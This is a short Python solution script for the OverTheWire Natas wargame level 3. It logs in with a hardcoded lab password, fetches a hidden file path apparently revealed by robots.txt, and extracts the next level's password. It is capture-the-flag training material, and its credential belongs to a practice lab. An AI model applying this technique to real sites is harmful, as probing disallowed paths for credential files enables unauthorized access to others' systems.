# Vulnerability: Sensitive information exposed in robots.txt file

import requests
import re
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/s3cr3t/users.txt'


# Make a GET request to the URL with basic authentication using the provided credentials
resp = requests.get(url=url, auth=(username, password))


# Extract the password for the next level using Regular Expressions
print(f"Natas4: {re.findall('natas4:(.*)', resp.text)[0]}")
